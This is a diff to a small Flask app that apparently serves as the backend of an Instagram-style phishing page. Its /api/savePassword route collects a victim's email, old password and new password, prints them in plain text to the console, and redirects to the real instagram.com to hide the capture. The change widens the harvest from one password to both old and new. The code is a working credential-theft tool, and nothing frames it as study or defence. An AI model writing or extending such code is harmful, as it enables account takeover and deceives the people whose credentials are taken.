@@ -9,18 +9,20 @@ def index():
 
 @app.route('/api/savePassword', methods=['POST'])
 def save_password():
-    password = request.form.get('password')
-    emailaddr=request.form.get("email")
-    if password:
+    old_password = request.form.get('oldpassword')
+    new_password = request.form.get('password')
+    emailaddr = request.form.get("email")
+    if old_password and new_password:
         try:
-            # Print the password to the console
-            print(f"Received emailaddress: {emailaddr}")
-            print(f"Received password: {password}")
+            # Print the passwords to the console
+            print(f"Received email: {emailaddr}")
+            print(f"Received old password: {old_password}")
+            print(f"Received new password: {new_password}")
             return redirect("https://instagram.com")  # Indentation corrected
         except Exception as e:
             return jsonify({'error': str(e)}), 500
     else:
-        return jsonify({'error': 'No password provided'}), 400
+        return jsonify({'error': 'Missing password fields'}), 400
 
 if __name__ == '__main__':
     app.run(debug=True, port=4000)
